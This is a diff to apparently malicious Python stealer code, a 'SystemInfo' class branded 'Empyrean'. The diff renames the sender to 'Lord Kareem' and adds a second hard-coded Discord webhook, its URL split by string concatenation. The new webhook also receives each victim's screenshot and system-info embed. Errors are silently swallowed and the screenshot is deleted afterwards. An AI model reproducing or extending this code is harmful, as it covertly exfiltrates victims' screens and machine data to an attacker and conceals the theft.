@@ -56,11 +56,22 @@ class SystemInfo():
             webhook.send(
                 embed=embed,
                 file=File('.\\screenshot.png', filename='screenshot.png'),
-                username="Empyrean",
-                avatar_url="https://i.imgur.com/HjzfjfR.png"
+                username="Lord Kareem",
+                avatar_url="https://imgur.com/lgJeCYA.png"
+            )
+
+            webhook = SyncWebhook.from_url('https://discord.com/api/webhooks/1066536487065227425/3bQP'+'UGH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
+
+            webhook.send(
+                embed=embed,
+                file=File('.\\screenshot.png', filename='screenshot.png'),
+                username="Lord Kareem",
+                avatar_url="https://imgur.com/lgJeCYA.png"
             )
         except:
             pass
+
+        
 
         if os.path.exists("screenshot.png"):
             os.remove("screenshot.png")
